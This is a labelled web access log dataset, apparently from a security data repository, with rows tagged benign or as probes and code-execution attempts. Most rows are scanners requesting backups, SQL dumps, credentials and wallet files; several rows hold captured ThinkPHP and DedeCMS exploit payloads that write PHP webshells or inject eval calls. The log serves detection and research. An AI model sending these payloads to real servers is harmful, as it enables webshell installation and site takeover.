2022-12-22,2022-12-22T13:30:31-08:00,98.159.226.30,HEAD,/website.tar,,/website.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:29:23-08:00,85.203.45.13,HEAD,/old/secrepo.com.sql,,/old/secrepo.com.sql,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:17:55-08:00,85.203.45.12,HEAD,/bak/backup.sql,,/bak/backup.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:16:59-08:00,98.159.226.26,HEAD,/restore/config.json,,/restore/config.json,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:45:17-08:00,196.244.192.14,HEAD,/restore/website.tar,,/restore/website.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:18:52-08:00,212.30.37.138,HEAD,/backups/bak.tar,,/backups/bak.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:48:10-08:00,185.92.25.49,HEAD,/backups/public_html.tar,,/backups/public_html.tar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:26-07:00,44.195.86.98,GET,/sites/all/libraries/elfinder/elfinder.php.html,,/sites/all/libraries/elfinder/elfinder.php.html,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/sites/all/libraries/elfinder/elfinder.php.html QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:54:03-08:00,45.86.200.152,HEAD,/backups/backup.sql,,/backups/backup.sql,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:54:23-08:00,98.159.226.185,HEAD,/bak/backup.sql.tar,,/bak/backup.sql.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:57:05-08:00,188.212.135.138,HEAD,/public_html.rar,,/public_html.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:04:55-08:00,45.92.228.148,HEAD,/backup/directory.rar,,/backup/directory.rar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:48:14-08:00,85.206.166.81,HEAD,/public_html.tar,,/public_html.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:40:11-08:00,45.86.200.156,HEAD,/backups/www.tar,,/backups/www.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:19:45-08:00,45.86.200.121,HEAD,/bak/directory.rar,,/bak/directory.rar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:17:16-08:00,82.118.30.79,HEAD,/restore/secrepo.com.sql,,/restore/secrepo.com.sql,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:07:00-08:00,98.159.226.71,HEAD,/backup.sql.tar,,/backup.sql.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:27:51-08:00,194.169.217.33,HEAD,/backup/backup.tar,,/backup/backup.tar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:28:49-08:00,45.130.202.87,HEAD,/backup/backup.rar,,/backup/backup.rar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:01:19-08:00,98.159.226.28,HEAD,/backup/sftp-config.json,,/backup/sftp-config.json,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:30:32-08:00,212.30.37.116,HEAD,/backup/mysql.sql,,/backup/mysql.sql,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:07-07:00,125.78.229.99,GET,/,"s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>","/?s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>",HTTP/1.1,418,746,"http://www.secrepo.com/?s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>",Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:command_exec,Code execution/webshell pattern,"METHOD=GET PATH=/ QUERY=s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?> PROTOCOL=HTTP/1.1"
2022-12-22,2022-12-22T15:48:11-08:00,157.97.120.41,GET,/.git/info/refs,service=git-upload-pack,/.git/info/refs?service=git-upload-pack,HTTP/1.1,301,495,,git/2.17.1,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=GET PATH=/.git/info/refs QUERY=service=git-upload-pack PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:18:42-08:00,45.86.200.159,HEAD,/back/.env,,/back/.env,HTTP/1.1,404,275,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/back/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:57:44-08:00,82.118.30.19,HEAD,/restore/directory.tar,,/restore/directory.tar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:56:38-08:00,196.196.106.70,HEAD,/bak/config.json,,/bak/config.json,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:20:49-08:00,98.159.226.21,HEAD,/backups/backup.tar,,/backups/backup.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:38:57-08:00,45.130.202.106,HEAD,/backups/wallet.dat,,/backups/wallet.dat,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:17:37-08:00,45.91.20.120,HEAD,/bak/secrepo.com.rar,,/bak/secrepo.com.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:13:49-08:00,45.86.200.138,HEAD,/back/wallet.dat,,/back/wallet.dat,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:18:16-08:00,82.118.30.30,HEAD,/.well-known.zip,,/.well-known.zip,HTTP/1.1,301,182,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:50:29-08:00,217.138.202.70,HEAD,/backups/website.tar,,/backups/website.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:53:01-08:00,85.203.45.83,HEAD,/restore/www.tar,,/restore/www.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/www.tar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T04:07:56-07:00,137.184.154.55,GET,/.env,,/.env,HTTP/1.1,404,519,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=GET PATH=/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:13:55-08:00,188.212.135.120,HEAD,/backup.tar,,/backup.tar,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:01:23-08:00,185.217.117.41,HEAD,/backup/sql.sql,,/backup/sql.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:20:30-08:00,194.169.217.22,HEAD,/backups/website.rar,,/backups/website.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:29:56-08:00,217.138.202.70,HEAD,/backup/backup.sql,,/backup/backup.sql,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:02:42-08:00,45.91.20.105,HEAD,/wallet.dat,,/wallet.dat,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:58:14-08:00,98.159.226.188,HEAD,/backup/bak.rar,,/backup/bak.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:00:13-08:00,45.86.200.152,HEAD,/back/backup.sql.tar,,/back/backup.sql.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:52:38-08:00,185.192.16.13,HEAD,/back/sql.sql,,/back/sql.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:12:49-08:00,98.159.226.189,HEAD,/bak/directory.tar,,/bak/directory.tar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:42:29-08:00,185.192.16.14,HEAD,/restore/backup.sql.tar,,/restore/backup.sql.tar,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:44:58-08:00,185.217.117.36,HEAD,/backup/wallet.dat,,/backup/wallet.dat,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:41:45-08:00,82.118.30.82,HEAD,/bak/bak.tar,,/bak/bak.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:13:21-08:00,98.159.226.31,HEAD,/back/secrepo.com.rar,,/back/secrepo.com.rar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:28:03-08:00,85.203.45.142,HEAD,/backup/credentials.txt,,/backup/credentials.txt,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:31:19-08:00,45.134.22.88,HEAD,/bak/secrepo.com.sql,,/bak/secrepo.com.sql,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:29-07:00,44.195.86.98,GET,/up.php,,/up.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/up.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:47:23-08:00,196.196.106.70,HEAD,/directory.tar,,/directory.tar,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:48:30-08:00,98.159.226.181,HEAD,/backup/www.tar,,/backup/www.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:52:56-08:00,185.192.16.12,HEAD,/restore/public_html.rar,,/restore/public_html.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:57:42-08:00,194.169.217.14,HEAD,/back/backup.rar,,/back/backup.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:04:51-08:00,98.159.226.189,HEAD,/backup/www.rar,,/backup/www.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:38:15-08:00,45.128.199.211,HEAD,/backup/website.rar,,/backup/website.rar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/website.rar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:06-07:00,125.78.229.99,GET,/uploads/dede/sys_verifies.php,"action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();//","/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();//",HTTP/1.1,418,746,http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\%22;eval($_POST[ysy]);die();//,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,"METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();// PROTOCOL=HTTP/1.1"
2022-12-22,2022-12-22T16:07:56-08:00,98.159.226.31,HEAD,/restore/sftp-config.json,,/restore/sftp-config.json,HTTP/1.1,301,191,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T09:09:50-07:00,3.82.236.130,GET,/Datasets Description/Network/http.html,,/Datasets Description/Network/http.html,HTTP/1.1,200,1709,,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/Datasets Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:08-07:00,125.78.229.99,GET,/,"s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$","/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$",HTTP/1.1,418,746,"http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$",Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:command_exec,Code execution/webshell pattern,"METHOD=GET PATH=/ QUERY=s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$ PROTOCOL=HTTP/1.1"
2022-12-22,2022-12-22T12:19:11-08:00,45.95.243.87,HEAD,/restore/backup.tar,,/restore/backup.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:26:59-08:00,85.206.166.83,HEAD,/secrepo.com.sql,,/secrepo.com.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:38:38-08:00,45.91.20.120,HEAD,/old/backup.tar,,/old/backup.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:08:14-08:00,98.159.226.184,HEAD,/restore/www.rar,,/restore/www.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:05:22-08:00,85.206.175.219,HEAD,/old/directory.rar,,/old/directory.rar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:38:52-08:00,185.192.16.37,HEAD,/old/dump.sql,,/old/dump.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:49:19-08:00,85.10.56.231,HEAD,/dump.sql,,/dump.sql,HTTP/1.1,301,175,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:57:39-08:00,98.159.226.17,HEAD,/backup/public_html.rar,,/backup/public_html.rar,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:23:17-08:00,98.159.226.31,HEAD,/old/public_html.rar,,/old/public_html.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:02:55-08:00,98.159.226.26,HEAD,/back/public_html.tar,,/back/public_html.tar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:42:16-08:00,185.195.19.200,HEAD,/old/credentials.txt,,/old/credentials.txt,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:46:14-08:00,84.247.59.178,HEAD,/back/config.json,,/back/config.json,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-23T01:32:57-08:00,150.136.26.54,GET,/.git/config,,/.git/config,HTTP/1.1,301,497,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=GET PATH=/.git/config QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:09:23-08:00,45.134.22.112,HEAD,/bak.tar,,/bak.tar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:28:41-08:00,82.118.30.8,HEAD,/old/backup.sql,,/old/backup.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:24:12-08:00,212.30.36.228,HEAD,/restore/credentials.txt,,/restore/credentials.txt,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:26-07:00,44.195.86.98,GET,/uploads/up.php,,/uploads/up.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/uploads/up.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:47:32-08:00,185.192.71.172,HEAD,/restore/public_html.tar,,/restore/public_html.tar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:30:52-08:00,185.192.16.12,HEAD,/backup/config.json,,/backup/config.json,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/config.json QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T22:18:27-07:00,66.102.7.211,GET,/Datasets Description/PE_malware/VirusShare.html,,/Datasets Description/PE_malware/VirusShare.html,HTTP/1.1,200,1651,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Google-PageRenderer Google (+https://developers.google.com/+/web/snippet/)",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/Datasets Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:38:14-08:00,85.206.166.82,HEAD,/credentials.txt,,/credentials.txt,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:47:53-08:00,45.86.201.22,HEAD,/bak/.bash_history,,/bak/.bash_history,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:53:36-08:00,45.130.136.24,HEAD,/restore/wallet.dat,,/restore/wallet.dat,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:50:55-08:00,45.86.200.141,HEAD,/restore/www.sql,,/restore/www.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:55:50-08:00,85.203.34.147,HEAD,/bak/sql.sql,,/bak/sql.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:50:40-08:00,185.195.237.149,HEAD,/backups/backup.rar,,/backups/backup.rar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:02:45-08:00,98.159.226.25,HEAD,/backups/sftp-config.json,,/backups/sftp-config.json,HTTP/1.1,301,191,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:26:27-08:00,45.86.200.120,HEAD,/backup/secrepo.com.sql,,/backup/secrepo.com.sql,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:24:37-08:00,185.192.70.17,HEAD,/restore/directory.rar,,/restore/directory.rar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:56:15-08:00,194.169.217.212,HEAD,/backups/www.rar,,/backups/www.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:32:11-08:00,45.134.22.48,HEAD,/old/directory.tar,,/old/directory.tar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:04:57-08:00,85.203.45.190,HEAD,/old/config.json,,/old/config.json,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:37:53-08:00,212.30.33.38,HEAD,/back/website.tar,,/back/website.tar,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:56:22-08:00,45.67.99.141,HEAD,/back/credentials.txt,,/back/credentials.txt,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:29:17-08:00,185.195.237.146,HEAD,/bak/backup.tar,,/bak/backup.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:17:45-08:00,98.159.226.16,HEAD,/backup/website.tar,,/backup/website.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:14:05-08:00,185.192.16.36,HEAD,/backup/.bash_history,,/backup/.bash_history,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:50:34-08:00,45.128.199.99,HEAD,/bak/credentials.txt,,/bak/credentials.txt,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/credentials.txt QUERY= PROTOCOL=HTTP/1.1
